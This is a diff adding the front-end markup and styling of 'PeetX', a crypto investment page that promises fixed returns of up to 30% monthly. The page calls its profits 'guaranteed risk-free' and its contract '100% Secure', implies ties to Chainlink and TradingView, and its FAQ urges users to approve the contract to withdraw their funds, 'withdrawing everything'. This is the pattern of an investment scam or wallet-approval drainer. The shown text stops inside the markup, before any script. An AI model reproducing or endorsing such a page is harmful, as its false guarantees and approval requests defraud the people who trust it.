@@ -1,0 +1,1680 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PeetX - Crypto Investment & Yield Engine</title>
+    <link rel="icon" type="image/png" sizes="32x32" href="icon-512x512.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        /* Google Translate Widget Overrides to Prevent Layout Shifts and Glitches */
+        .goog-te-banner-frame, .goog-te-balloon-frame, #goog-gt-tt, .goog-te-gadget-icon {
+            display: none !important;
+            visibility: hidden !important;
+        }
+        body {
+            top: 0 !important;
+        }
+        .goog-tooltip {
+            display: none !important;
+        }
+        .goog-text-highlight {
+            background-color: transparent !important;
+            box-shadow: none !important;
+        }
+
+        :root {
+            --bg-color: #0b0713;
+            --card-bg: #141021;
+            --input-bg: #1e1830;
+            --accent-purple: #9d4edf;
+            --accent-gold: #ffd700;
+            --text-main: #ffffff;
+            --text-sub: #b1a7c4;
+            --border-color: rgba(255, 215, 0, 0.12);
+            --danger-color: #ff4d4d;
+            --success-color: #00ffcc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        .trada-app {
+            width: 100%;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .card {
+            background-color: var(--card-bg);
+            border-radius: 0;
+            padding: 16px 12px;
+            border: none;
+            border-bottom: 1px solid var(--border-color);
+            box-shadow: none;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .balance-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            background: rgba(255, 215, 0, 0.03);
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid var(--border-color);
+        }
+
+        .balance-title {
+            color: var(--text-sub);
+            font-size: 13px;
+        }
+
+        .balance-value {
+            color: var(--accent-gold);
+            font-weight: bold;
+            font-size: 15px;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .input-container {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .input-container input {
+            width: 100%;
+            padding: 14px 100px 14px 80px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-main);
+            font-size: 16px;
+            outline: none;
+            text-align: center;
+        }
+
+        .input-container input::placeholder {
+            text-align: center;
+            opacity: 0.7;
+        }
+
+        .min-badge-transparent {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            color: var(--text-sub);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 11px;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .btn-max {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 215, 0, 0.15);
+            color: var(--accent-gold);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            padding: 6px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .section-label {
+            font-size: 13px;
+            color: var(--text-sub);
+            margin-bottom: 10px;
+            margin-top: 10px;
+        }
+
+        .plans-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .plan-item {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            padding: 10px 4px;
+            border-radius: 12px;
+            cursor: pointer;
+            text-align: center;
+            font-size: 12px;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .plan-item.active {
+            border-color: var(--accent-gold);
+            background: rgba(255, 215, 0, 0.1);
+            color: var(--accent-gold);
+            font-weight: bold;
+            box-shadow: 0 0 12px rgba(255, 215, 0, 0.2);
+        }
+
+        .plan-rate {
+            font-size: 10px;
+            opacity: 0.8;
+        }
+
+        .profit-summary {
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            font-size: 13px;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .summary-item.total {
+            border-top: 1px solid var(--border-color);
+            padding-top: 8px;
+            font-weight: bold;
+            color: var(--accent-gold);
+            font-size: 14px;
+        }
+
+        .btn-main {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, var(--accent-purple), var(--accent-gold));
+            border: none;
+            border-radius: 25px;
+            color: #0b0713;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-main:hover {
+            opacity: 0.9;
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.5);
+        }
+
+        .live-trading-graphic {
+            width: 100%;
+            background: radial-gradient(circle, rgba(157,78,223,0.15) 0%, rgba(11,7,19,0.9) 80%);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 14px;
+            margin-top: 12px;
+            margin-bottom: 12px;
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .graphic-header {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            font-size: 11px;
+            color: var(--accent-gold);
+            font-weight: bold;
+            border-bottom: 1px dashed rgba(255, 215, 0, 0.2);
+            padding-bottom: 6px;
+        }
+
+        .network-mesh-container {
+            position: relative;
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px;
+        }
+
+        .node-circle {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: var(--input-bg);
+            border: 2px solid var(--accent-gold);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            font-weight: bold;
+            color: var(--accent-gold);
+            box-shadow: 0 0 12px rgba(255, 215, 0, 0.4);
+            z-index: 2;
+            position: relative;
+        }
+
+        .connecting-arrow-line {
+            position: absolute;
+            top: 50%;
+            left: 20%;
+            right: 20%;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent-purple), var(--accent-gold));
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+
+        .connecting-arrow-line::after {
+            content: '➔';
+            position: absolute;
+            right: 45%;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--accent-gold);
+            font-size: 12px;
+            animation: moveArrow 1.5s infinite linear;
+        }
+
+        @keyframes moveArrow {
+            0% { transform: translate(-20px, -50%); opacity: 0.2; }
+            50% { transform: translate(0px, -50%); opacity: 1; }
+            100% { transform: translate(20px, -50%); opacity: 0.2; }
+        }
+
+        .rotating-mesh-ring {
+            width: 32px;
+            height: 32px;
+            border: 2px dashed var(--accent-purple);
+            border-radius: 50%;
+            animation: spinRing 4s linear infinite;
+        }
+
+        @keyframes spinRing {
+            100% { transform: rotate(360deg); }
+        }
+
+        .graphic-footer-status {
+            font-size: 10px;
+            color: var(--text-sub);
+            text-align: center;
+            background: rgba(0,0,0,0.3);
+            padding: 4px 8px;
+            border-radius: 6px;
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+
+        .blockchain-trust-bar {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            background: rgba(255, 215, 0, 0.04);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 10px 8px;
+            margin: 12px 0;
+            gap: 6px;
+        }
+
+        .trust-badge-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            font-size: 10px;
+            color: var(--text-sub);
+            gap: 3px;
+        }
+
+        .trust-badge-item span:first-child {
+            font-size: 15px;
+            color: var(--accent-gold);
+        }
+
+        .trust-badge-item b {
+            color: var(--text-main);
+            font-size: 11px;
+        }
+
+        .orders-header-wrapper {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 10px;
+            margin-bottom: 14px;
+        }
+
+        .orders-title {
+            color: var(--accent-gold);
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .btn-refresh {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--accent-purple);
+            padding: 5px 10px;
+            border-radius: 8px;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .order-card {
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 12px;
+            position: relative;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .order-header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 13px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+            padding-bottom: 8px;
+        }
+
+        .order-meta-info {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--text-sub);
+            margin-bottom: 8px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        .order-meta-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .order-meta-info span b {
+            color: var(--accent-gold);
+        }
+
+        .timer-display {
+            text-align: center;
+            font-size: 16px;
+            font-weight: bold;
+            color: var(--accent-gold);
+            background: rgba(0, 0, 0, 0.5);
+            padding: 8px;
+            border-radius: 8px;
+            letter-spacing: 1px;
+            margin: 10px 0;
+            direction: ltr;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
+
+        .action-row {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 10px;
+        }
+
+        .btn-order {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .btn-claim-inactive {
+            background: rgba(0, 255, 204, 0.08);
+            color: rgba(0, 255, 204, 0.35);
+            border: 1px solid rgba(0, 255, 204, 0.15);
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .btn-claim-active {
+            background: linear-gradient(90deg, #00ffcc, var(--accent-purple));
+            color: #0b0713;
+            box-shadow: 0 0 15px rgba(0, 255, 204, 0.4);
+            cursor: pointer;
+            pointer-events: auto;
+        }
+
+        .btn-early-withdraw {
+            background: rgba(255, 77, 77, 0.15);
+            border: 1px solid var(--danger-color);
+            color: var(--danger-color);
+        }
+
+        .platform-banner {
+            width: 100%;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 1px solid var(--border-color);
+            background: linear-gradient(135deg, rgba(157, 78, 223, 0.2), rgba(255, 215, 0, 0.1));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .platform-banner h4 {
+            color: var(--accent-gold);
+            font-size: 15px;
+            margin-bottom: 6px;
+        }
+
+        .platform-banner p {
+            color: var(--text-sub);
+            font-size: 11px;
+            line-height: 1.4;
+        }
+
+        .rotator-container {
+            width: 100%;
+            height: 200px;
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 1px solid var(--border-color);
+            position: relative;
+            background: #000;
+        }
+
+        .rotator-container iframe, .rotator-container img {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+            object-fit: cover;
+        }
+
+        .rotator-container iframe.active, .rotator-container img.active {
+            opacity: 1;
+            z-index: 2;
+        }
+
+        .plans-overview-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .plan-box-card {
+            border-radius: 12px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            background: var(--input-bg);
+        }
+
+        .plan-box-title { font-size: 13px; font-weight: bold; color: var(--accent-gold); }
+        .plan-box-return { font-size: 16px; font-weight: 800; color: #fff; }
+        .plan-box-desc { font-size: 11px; color: var(--text-sub); }
+
+        .simulation-table-wrapper {
+            overflow-x: auto;
+            margin: 14px 0;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            background: var(--input-bg);
+        }
+
+        .simulation-table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .simulation-table th {
+            background: rgba(157, 78, 223, 0.2);
+            color: var(--accent-gold);
+            padding: 10px 8px;
+            font-weight: bold;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .simulation-table td {
+            padding: 10px 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: var(--text-main);
+        }
+
+        .simulation-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .simulation-table tr:hover {
+            background: rgba(255, 215, 0, 0.03);
+        }
+
+        .partners-container {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            margin-bottom: 8px;
+        }
+
+        .partner-link-btn {
+            flex: 1;
+            padding: 10px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border-color);
+            color: #fff;
+            text-decoration: none;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-weight: bold;
+        }
+
+        .circular-hub-container {
+            width: 100%;
+            height: 280px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 16px 0;
+            background: radial-gradient(circle, rgba(157,78,223,0.12) 0%, rgba(11,7,19,0.95) 85%);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .hub-outer-ring {
+            width: 230px;
+            height: 230px;
+            border: 1px dashed rgba(255, 215, 0, 0.25);
+            border-radius: 50%;
+            position: absolute;
+            animation: spinRing 25s linear infinite;
+        }
+
+        .hub-center-circle {
+            width: 76px;
+            height: 76px;
+            border-radius: 50%;
+            background: radial-gradient(circle, #1e1830 0%, #0b0713 100%);
+            border: 2px solid var(--accent-gold);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
+            z-index: 3;
+            position: relative;
+        }
+
+        .hub-center-circle img {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            object-fit: cover;
+            animation: spinRing 25s linear reverse infinite;
+        }
+
+        .hub-node {
+            position: absolute;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            padding: 6px 10px;
+            border-radius: 10px;
+            font-size: 11px;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+            white-space: nowrap;
+            z-index: 2;
+        }
+
+        .hub-node span {
+            color: var(--accent-gold);
+            font-size: 13px;
+        }
+
+        .node-1 { top: 15px; left: 50%; transform: translateX(-50%); }
+        .node-2 { top: 45px; right: 25px; }
+        .node-3 { top: 50%; right: 10px; transform: translateY(-50%); border-color: var(--accent-gold); background: rgba(255,215,0,0.08); }
+        .node-4 { bottom: 45px; right: 25px; }
+        .node-5 { bottom: 15px; left: 50%; transform: translateX(-50%); }
+        .node-6 { bottom: 45px; left: 25px; }
+        .node-7 { top: 50%; left: 10px; transform: translateY(-50%); }
+        .node-8 { top: 45px; left: 25px; }
+
+        .faq-item {
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 0;
+        }
+        .faq-item:last-child { border-bottom: none; }
+        .faq-question { font-size: 13px; font-weight: bold; color: var(--text-main); cursor: pointer; display: flex; justify-content: space-between; }
+        .faq-answer { font-size: 12px; color: var(--text-sub); line-height: 1.6; margin-top: 8px; display: none; }
+        .faq-item.active .faq-answer { display: block; }
+
+        .pool-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--accent-gold);
+            text-decoration: none;
+            font-size: 12px;
+            margin-top: 8px;
+            font-weight: bold;
+        }
+
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 16px;
+        }
+
+        .modal-body {
+            background: var(--card-bg);
+            border: 1px solid var(--danger-color);
+            border-radius: 16px;
+            padding: 20px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .modal-body h4 { color: var(--danger-color); margin-bottom: 12px; font-size: 16px; }
+        .modal-body p { font-size: 13px; color: var(--text-sub); line-height: 1.5; margin-bottom: 20px; }
+        .modal-actions { display: flex; gap: 10px; }
+        .btn-modal { flex: 1; padding: 10px; border-radius: 8px; border: none; font-size: 13px; font-weight: bold; cursor: pointer; }
+        .btn-confirm { background: var(--danger-color); color: #fff; }
+        .btn-cancel { background: var(--input-bg); color: var(--text-main); }
+        .empty-msg { text-align: center; color: var(--text-sub); font-size: 13px; padding: 12px 0; }
+
+        .custom-alert-box {
+            background: var(--card-bg);
+            border: 1px solid var(--accent-gold);
+            border-radius: 16px;
+            padding: 20px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
+        }
+        .custom-alert-box h4 { color: var(--accent-gold); margin-bottom: 10px; font-size: 16px; }
+        .custom-alert-box p { font-size: 13px; color: var(--text-main); line-height: 1.5; margin-bottom: 18px; }
+        .btn-alert-close {
+            width: 100%;
+            padding: 10px;
+            background: var(--accent-gold);
+            color: #0b0713;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="trada-app">
+
+    <div class="card">
+        <div class="balance-box">
+            <span class="balance-title">USDT Balance</span>
+            <span class="balance-value" id="userUsdtBalance">-- USDT</span>
+        </div>
+
+        <div class="input-container">
+            <input type="number" id="investInput" placeholder="Enter amount..." oninput="handleInputChange()">
+            <div class="min-badge-transparent" id="minBadge">Min 1 USD</div>
+            <button class="btn-max" onclick="applyMaxBalance()">Max</button>
+        </div>
+
+        <div class="section-label">Choose trading cycle</div>
+        <div class="plans-grid">
+            <div class="plan-item active" onclick="setPlan(1, 1, this)">
+                <span>1 Day</span>
+                <span class="plan-rate">1%</span>
+            </div>
+            <div class="plan-item" onclick="setPlan(7, 7, this)">
+                <span>7 Days</span>
+                <span class="plan-rate">7%</span>
+            </div>
+            <div class="plan-item" onclick="setPlan(20, 20, this)">
+                <span>20 Days</span>
+                <span class="plan-rate">20%</span>
+            </div>
+            <div class="plan-item" onclick="setPlan(30, 30, this)">
+                <span>30 Days</span>
+                <span class="plan-rate">30%</span>
+            </div>
+        </div>
+
+        <div class="profit-summary">
+            <div class="summary-item">
+                <span>Profit Rate:</span>
+                <span id="displayRate">1%</span>
+            </div>
+            <div class="summary-item">
+                <span>Expected Profit:</span>
+                <span id="displayProfit">0.0000 USDT</span>
+            </div>
+            <div class="summary-item total">
+                <span>Total Return (with Capital):</span>
+                <span id="displayTotal">0.0000 USDT</span>
+            </div>
+        </div>
+
+        <div class="live-trading-graphic">
+            <div class="graphic-header">
+                <span>PeetX Engine & Uniswap Route</span>
+                <span style="color:var(--accent-purple);">USDT / Uniswap Live Trades</span>
+            </div>
+            <div class="network-mesh-container">
+                <div class="node-circle" title="User Capital">
+                    <span>USDT</span>
+                </div>
+                <div class="connecting-arrow-line"></div>
+                <div class="node-circle rotating-mesh-ring" title="Uniswap Pool & Smart Router">
+                    <span style="font-size:9px; color:var(--accent-gold);">⚡</span>
+                </div>
+                <div class="connecting-arrow-line" style="background: linear-gradient(90deg, var(--accent-gold), #00ffcc);"></div>
+                <div class="node-circle" title="Yield Return">
+                    <span>BNB</span>
+                </div>
+            </div>
+            <div class="graphic-footer-status">
+                Funds routed securely through Uniswap liquidity pool, trades executed, and capital returned automatically.
+            </div>
+        </div>
+
+        <div class="blockchain-trust-bar">
+            <div class="trust-badge-item">
+                <span>🛡️</span>
+                <b>Audited Contract</b>
+                <span>100% Secure</span>
+            </div>
+            <div class="trust-badge-item">
+                <span>⚡</span>
+                <b>Instant Route</b>
+                <span>Zero Slippage</span>
+            </div>
+            <div class="trust-badge-item">
+                <span>💎</span>
+                <b>Real Yield</b>
+                <span>Verified Profits</span>
+            </div>
+            <div class="trust-badge-item">
+                <span>🌐</span>
+                <b>Global Partner</b>
+                <span>Chainlink Oracle</span>
+            </div>
+        </div>
+
+        <button class="btn-main" id="mainActionButton" onclick="handleInvestButtonClick()">Invest</button>
+    </div>
+
+    <div class="card">
+        <div class="orders-header-wrapper">
+            <div class="orders-title">Current Active Contracts</div>
+            <button class="btn-refresh" onclick="refreshContractData()" id="refreshBtn">
+                <span>🔄</span> <span>Refresh</span>
+            </button>
+        </div>
+
+        <div id="activeOrdersContainer">
+            <div class="empty-msg">No active contracts currently</div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="platform-banner">
+            <h4>PeetX Secure Smart Yield Ecosystem</h4>
+            <p>Fully secured decentralized trading via smart contracts to ensure highest efficiency and stable daily returns.</p>
+        </div>
+
+        <div class="rotator-container" id="imageRotator">
+            <img src="mha1.png" class="active" alt="MHA 1" />
+            <img src="mha6.png" alt="MHA 6" />
+            <img src="mha2.png" alt="MHA 2" />
+            <img src="mha3.png" alt="MHA 3" />
+            <img src="mha4.png" alt="MHA 4" />
+            <img src="mha5.png" alt="MHA 5" />
+        </div>
+
+        <div class="plans-overview-grid">
+            <div class="plan-box-card">
+                <div class="plan-box-title">1 Day Plan</div>
+                <div class="plan-box-return">+1%</div>
+                <div class="plan-box-desc">Full flexibility and fast return.</div>
+            </div>
+            <div class="plan-box-card">
+                <div class="plan-box-title">7 Days Plan</div>
+                <div class="plan-box-return">+7%</div>
+                <div class="plan-box-desc">Measured weekly growth.</div>
+            </div>
+            <div class="plan-box-card">
+                <div class="plan-box-title">20 Days Plan</div>
+                <div class="plan-box-return">+20%</div>
+                <div class="plan-box-desc">Medium-term returns.</div>
+            </div>
+            <div class="plan-box-card">
+                <div class="plan-box-title">30 Days Plan</div>
+                <div class="plan-box-return">+30%</div>
+                <div class="plan-box-desc">Maximum compound interest.</div>
+            </div>
+        </div>
+
+        <div class="section-label" style="text-align: center; font-weight: bold; color: var(--accent-gold);">Investment Simulation (10,000 USDT Principal)</div>
+        <div class="simulation-table-wrapper">
+            <table class="simulation-table">
+                <thead>
+                    <tr>
+                        <th>Duration</th>
+                        <th>Profit Rate</th>
+                        <th>Profit Amount</th>
+                        <th>Total Return</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Daily (1 Day)</td>
+                        <td>1%</td>
+                        <td>100.00 <span>USDT</span></td>
+                        <td>10,100.00 <span>USDT</span></td>
+                    </tr>
+                    <tr>
+                        <td>7 Days</td>
+                        <td>7%</td>
+                        <td>700.00 <span>USDT</span></td>
+                        <td>10,700.00 <span>USDT</span></td>
+                    </tr>
+                    <tr>
+                        <td>20 Days</td>
+                        <td>20%</td>
+                        <td>2,000.00 <span>USDT</span></td>
+                        <td>12,000.00 <span>USDT</span></td>
+                    </tr>
+                    <tr>
+                        <td>30 Days (Max Monthly)</td>
+                        <td>30%</td>
+                        <td>3,000.00 <span>USDT</span></td>
+                        <td>13,000.00 <span>USDT</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="partners-container">
+            <a href="https://www.tradingview.com" target="_blank" class="partner-link-btn">
+                📊 TradingView ↗
+            </a>
+            <a href="https://chain.link" target="_blank" class="partner-link-btn">
+                🔗 Chainlink ↗
+            </a>
+        </div>
+
+        <a href="https://dexscreener.com/bsc/0x6fe9e9de56356f7edbfcbb29fab7cd69471a4869" target="_blank" class="pool-link">
+            🔍 <span>Track liquidity and trades via explorer</span> ↗
+        </a>
+    </div>
+
+    <div class="circular-hub-container">
+        <div class="hub-outer-ring"></div>
+        <div class="hub-center-circle">
+            <img src="favicon-32x32.png" alt="Project Favicon">
+        </div>
+        <div class="hub-node node-1"><span>🪙</span> <span>Rewards</span></div>
+        <div class="hub-node node-2"><span>🔄</span> <span>Uniswap Swap</span></div>
+        <div class="hub-node node-3"><span>🎛️</span> <span>Dashboard</span></div>
+        <div class="hub-node node-4"><span>👛</span> <span>Wallet</span></div>
+        <div class="hub-node node-5"><span>💵</span> <span>USDT Deposit</span></div>
+        <div class="hub-node node-6"><span>🔁</span> <span>AddLiquidity</span></div>
+        <div class="hub-node node-7"><span>📈</span> <span>Secure Investment</span></div>
+        <div class="hub-node node-8"><span>👥</span> <span>Referral</span></div>
+    </div>
+
+    <div class="card">
+        <div class="section-title-bar">
+            <h3 style="margin-bottom:10px; font-size: 14px; color: var(--accent-gold);">❓ Frequently Asked Questions & Ecosystem Clarification</h3>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>Automatic and manual withdrawal simultaneously via global Chainlink Oracle decentralized network</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                <span>When the investment plan that converts automatically reaches completion and more than one minute has passed, users can manually withdraw via the claim function. Global Chainlink Oracle decentralized network processes withdrawals instantly. Due to high transaction volume surges and queue delays, if any process takes more than 1 minute without automatic execution by the contract, a claim button appears on the finished plan card. This enables the user to sign and instantly execute a direct transfer of their principal capital and plan profit immediately and smoothly. This feature was added to provide ultimate convenience and security for our valued users.</span>
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>Smart contract permissions system for investment and trading</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                <span>Our decentralized system relies on the official Bank Swap code without proxies, bots, or monitoring servers to oversee investments. To ensure absolute decentralization, when a user initiates an investment or trading session, they must grant permission to the contract to withdraw the user's funds for a specific amount entered by the user. The user signs, and signs again to execute the investment immediately, withdrawing everything to guarantee 100% decentralization. Everything is transparent so that the user knows they are interacting with a contract that contains no proxy or owner, operating independently and permanently forever.</span>
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>Does the system accept manual or direct transfers to the decentralized contract?</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                <span>There are no external direct receiving functions in the contract to prevent fake transactions and re-entrancy vulnerabilities. Any direct manual transfer is strictly rejected; funds must be processed exclusively through the investment functions or trading section for user safety and to eliminate re-entrancy exploits. Everything is completely transparent and verifiable in the contract code.</span>
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>What is the nature of the investment and profit system?</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                <span>Automated investment designed with the highest security standards with stable interest up to</span> <strong>30% monthly</strong>. <span>The invested amount is deducted and traded securely inside a liquidity pool, guaranteeing risk-free trading profits based on analyses from the world's largest exchange data source Chainlink Data, with charts powered by TradingView. Real trading source verified through USDT transactions routed automatically and returning safely to the user via Uniswap liquidity pools.</span>
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>What happens when a user withdrawal is requested?</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                If the user has an active referral upline, the capital is refunded and only the exact percentage of profits that were distributed to the upline is deducted. If the user joined without any referral upline, 100% of the full capital is refunded with zero deductions. This feature was added to prevent frequent investments and withdrawals solely for referral farming and profits, thereby protecting the project and safeguarding our community.
+            </div>
+        </div>
+
+        <div class="faq-item" onclick="toggleFaq(this)">
+            <div class="faq-question">
+                <span>When are profits added to my wallet?</span>
+                <span>+</span>
+            </div>
+            <div class="faq-answer">
+                At the end of the investment period, an automatic transfer is made via the smart contract or via manual signature after 1 minute queue timeout.
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<div class="modal-overlay" id="earlyModal">
+    <div class="modal-body">
+        <h4>⚠️ Early Withdrawal Warning</h4>
+        <p id="earlyModalText">If you joined via a referral, only the distributed percentage is deducted from your capital refund. For example, if you invested 100 USD, withdrew early, and 1 USD was distributed to referrals, that 1 USD is deducted and 99 USD is returned to you. If you joined without a referral, your full capital is refunded completely intact. This feature was added to prevent frequent investments and withdrawals solely for referral farming and profits, thereby protecting the project and safeguarding our community.</p>
+        <div class="modal-actions">
+            <button class="btn-modal btn-confirm" onclick="executeEarlyWithdrawal()">Accept and Continue</button>
+            <button class="btn-modal btn-cancel" onclick="closeEarlyModal()">Cancel</button>
+        </div>
+    </div>
+</div>
+
+<div class="modal-overlay" id="notificationModal">
+    <div class="modal-body" style="border-color: var(--accent-gold);">
+        <h4 style="color: var(--accent-gold);">🔔 Enable Instant Notifications</h4>
+        <p>Please allow notification permissions so that instant alerts can be sent directly to your device immediately when your investment cycle finishes, even when interacting from a decentralized wallet.</p>
+        <div class="modal-actions">
+            <button class="btn-modal btn-confirm" style="background: var(--accent-gold); color: #0b0713;" onclick="requestNotificationPermission()">Allow & Proceed</button>
+        </div>
+    </div>
+</div>
+
+<div class="modal-overlay" id="customAlertModal">
+    <div class="custom-alert-box">
